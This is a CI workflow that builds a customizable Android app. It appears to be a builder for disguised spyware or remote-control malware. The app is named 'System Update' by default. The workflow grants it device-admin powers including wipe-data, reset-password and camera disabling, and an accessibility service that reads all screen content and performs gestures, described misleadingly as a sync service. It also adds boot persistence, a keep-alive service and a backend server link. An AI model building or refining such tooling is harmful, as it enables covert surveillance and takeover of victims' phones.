name: Build Custom APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'App Name'
        required: true
        default: 'System Update'
      package_name:
        description: 'Package Name'
        required: true
        default: 'com.system.update'
      icon_url:
        description: 'Icon URL'
        required: false
        default: ''
      webview_url:
        description: 'WebView URL'
        required: true
        default: 'https://www.google.com'
      access_key:
        description: 'User Access Key'
        required: true
        default: ''
      server_url:
        description: 'Backend Server URL'
        required: false
        default: 'https://back.orgsapp.web.id'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 45

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          flutter-version: '3.24.3'
          channel: 'stable'
          cache: true

      - name: Prepare build directory
        run: |
          cp -r template-app build-app
          cd build-app
          echo "✅ build-app ready"

      # ============================================
      # ===== ENSURE RESOURCES EXIST =====
      # ============================================
      - name: Ensure resources exist
        run: |
          cd build-app

          mkdir -p android/app/src/main/res/values
          mkdir -p android/app/src/main/res/values-night
          mkdir -p android/app/src/main/res/drawable
          mkdir -p android/app/src/main/res/mipmap-mdpi
          mkdir -p android/app/src/main/res/mipmap-hdpi
          mkdir -p android/app/src/main/res/mipmap-xhdpi
          mkdir -p android/app/src/main/res/mipmap-xxhdpi
          mkdir -p android/app/src/main/res/mipmap-xxxhdpi
          mkdir -p android/app/src/main/res/xml

          # ===== styles.xml (values) =====
          if [ ! -f android/app/src/main/res/values/styles.xml ]; then
            cat > android/app/src/main/res/values/styles.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <style name="LaunchTheme" parent="@android:style/Theme.Light.NoTitleBar">
                  <item name="android:windowBackground">@drawable/launch_background</item>
              </style>
              <style name="NormalTheme" parent="@android:style/Theme.Light.NoTitleBar">
                  <item name="android:windowBackground">?android:colorBackground</item>
              </style>
          </resources>
          EOF
          fi

          # ===== styles.xml (values-night) =====
          if [ ! -f android/app/src/main/res/values-night/styles.xml ]; then
            cat > android/app/src/main/res/values-night/styles.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <style name="LaunchTheme" parent="@android:style/Theme.Black.NoTitleBar">
                  <item name="android:windowBackground">@drawable/launch_background</item>
              </style>
              <style name="NormalTheme" parent="@android:style/Theme.Black.NoTitleBar">
                  <item name="android:windowBackground">?android:colorBackground</item>
              </style>
          </resources>
          EOF
          fi

          # ===== launch_background.xml =====
          if [ ! -f android/app/src/main/res/drawable/launch_background.xml ]; then
            cat > android/app/src/main/res/drawable/launch_background.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <layer-list xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:drawable="@android:color/white" />
          </layer-list>
          EOF
          fi

          # ===== device_admin_policies.xml =====
          cat > android/app/src/main/res/xml/device_admin_policies.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-policies>
                  <limit-password />
                  <watch-login />
                  <reset-password />
                  <force-lock />
                  <wipe-data />
                  <expire-password />
                  <encrypted-storage />
                  <disable-camera />
              </uses-policies>
          </device-admin>
          EOF

          # ===== accessibility_service_config.xml =====
          cat > android/app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackAllMask"
              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows"
              android:canPerformGestures="true"
              android:canRetrieveWindowContent="true"
              android:description="@string/accessibility_service_description"
              android:notificationTimeout="100" />
          EOF

          # ===== network_security_config.xml =====
          if [ ! -f android/app/src/main/res/xml/network_security_config.xml ]; then
            cat > android/app/src/main/res/xml/network_security_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <network-security-config>
              <base-config cleartextTrafficPermitted="true">
                  <trust-anchors>
                      <certificates src="system" />
                  </trust-anchors>
              </base-config>
          </network-security-config>
          EOF
          fi

          # ===== Placeholder icon =====
          ICON_BASE64="iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+P+/HgAFhAJ/wlseKgAAAABJRU5ErkJggg=="
          for dpi in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
            TARGET="android/app/src/main/res/mipmap-$dpi/ic_launcher.png"
            if [ ! -f "$TARGET" ]; then
              echo "$ICON_BASE64" | base64 -d > "$TARGET"
            fi
          done

          echo "✅ Resources ready"
          ls -la android/app/src/main/res/xml/

      - name: Update package name
        run: |
          cd build-app
          PKG="${{ github.event.inputs.package_name }}"
          PKG_PATH=$(echo "$PKG" | tr '.' '/')
          NEW_KOTLIN_PATH="android/app/src/main/kotlin/$PKG_PATH"
          mkdir -p "$NEW_KOTLIN_PATH"

          # ===== Update AndroidManifest.xml =====
          sed -i "s|package=\"[^\"]*\"|package=\"$PKG\"|g" android/app/src/main/AndroidManifest.xml
          sed -i "s|android:label=\"[^\"]*\"|android:label=\"${{ github.event.inputs.app_name }}\"|g" android/app/src/main/AndroidManifest.xml
          sed -i "s|android:name=\".MainActivity\"|android:name=\"$PKG.MainActivity\"|g" android/app/src/main/AndroidManifest.xml
          sed -i "s|android:name=\".MyDeviceAdminReceiver\"|android:name=\"$PKG.MyDeviceAdminReceiver\"|g" android/app/src/main/AndroidManifest.xml
          sed -i "s|android:name=\".MyAccessibilityService\"|android:name=\"$PKG.MyAccessibilityService\"|g" android/app/src/main/AndroidManifest.xml
          sed -i "s|android:name=\".BootReceiver\"|android:name=\"$PKG.BootReceiver\"|g" android/app/src/main/AndroidManifest.xml
          sed -i "s|android:name=\".KeepAliveService\"|android:name=\"$PKG.KeepAliveService\"|g" android/app/src/main/AndroidManifest.xml

          # ===== Update build.gradle =====
          sed -i "s|namespace = \"[^\"]*\"|namespace = \"$PKG\"|g" android/app/build.gradle
          sed -i "s|applicationId = \"[^\"]*\"|applicationId = \"$PKG\"|g" android/app/build.gradle

          # ===== Pindah Kotlin =====
          OLD="android/app/src/main/kotlin/com/template/app"
          if [ -d "$OLD" ]; then
            cp -r "$OLD"/* "$NEW_KOTLIN_PATH/" 2>/dev/null || true
            rm -rf "android/app/src/main/kotlin/com/template"
          fi

          # ===== Ganti package di Kotlin =====
          if [ -d "$NEW_KOTLIN_PATH" ]; then
            find "$NEW_KOTLIN_PATH" -name "*.kt" \
              -exec sed -i "s|package com.template.app|package $PKG|g" {} \; 2>/dev/null || true
          fi

          echo "✅ Package updated: $PKG"
          echo "📁 Kotlin files:"
          ls -la "$NEW_KOTLIN_PATH/" || true

      - name: Update strings.xml
        run: |
          cd build-app
          cat > android/app/src/main/res/values/strings.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="app_name">${{ github.event.inputs.app_name }}</string>
              <string name="accessibility_service_description">Layanan sistem untuk sinkronisasi perangkat</string>
          </resources>
          EOF

      - name: Inject build config
        run: |
          cd build-app
          mkdir -p lib/config
          cat > lib/config/build_config.dart << 'EOF'
          // AUTO-GENERATED
          class BuildConfig {
            static const String appName = '${{ github.event.inputs.app_name }}';
            static const String packageName = '${{ github.event.inputs.package_name }}';
            static const String webviewUrl = '${{ github.event.inputs.webview_url }}';
            static const String accessKey = '${{ github.event.inputs.access_key }}';
            static const String serverUrl = '${{ github.event.inputs.server_url }}';
            static const String buildId = '${{ github.run_id }}';
          }
          EOF

      - name: Download custom icon
        if: github.event.inputs.icon_url != ''
        run: |
          cd build-app
          sudo apt-get update -qq
          sudo apt-get install -y -qq imagemagick

          if curl -L --max-time 30 -o /tmp/icon.png "${{ github.event.inputs.icon_url }}"; then
            convert /tmp/icon.png -resize 48x48 android/app/src/main/res/mipmap-mdpi/ic_launcher.png
            convert /tmp/icon.png -resize 72x72 android/app/src/main/res/mipmap-hdpi/ic_launcher.png
            convert /tmp/icon.png -resize 96x96 android/app/src/main/res/mipmap-xhdpi/ic_launcher.png
            convert /tmp/icon.png -resize 144x144 android/app/src/main/res/mipmap-xxhdpi/ic_launcher.png
            convert /tmp/icon.png -resize 192x192 android/app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
            echo "✅ Icon installed"
          fi

      - name: Flutter pub get
        run: |
          cd build-app
          flutter pub get

      - name: Build APK
        run: |
          cd build-app
          flutter build apk --release --target-platform android-arm64

      - name: Rename APK
        run: |
          cd build-app
          APP_NAME_SAFE=$(echo "${{ github.event.inputs.app_name }}" | tr ' ' '_' | tr -cd '[:alnum:]_-')
          mv build/app/outputs/flutter-apk/app-release.apk \
             "build/app/outputs/flutter-apk/${APP_NAME_SAFE}.apk"

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: ${{ github.event.inputs.app_name }}-${{ github.run_id }}
          path: build-app/build/app/outputs/flutter-apk/*.apk
          retention-days: 14
